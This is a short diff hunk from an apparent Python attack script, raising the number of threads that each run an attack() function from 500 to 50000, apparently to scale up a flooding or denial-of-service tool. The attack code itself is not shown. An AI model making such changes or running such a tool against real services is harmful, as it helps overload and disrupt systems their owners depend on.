@@ -248,7 +248,7 @@ def attack():
 
 def process():
  try:
-  for i in range(500):#500
+  for i in range(50000):#500
    time.sleep(slEEp);
    thread = threading.Thread(target=attack);
    thread.start();
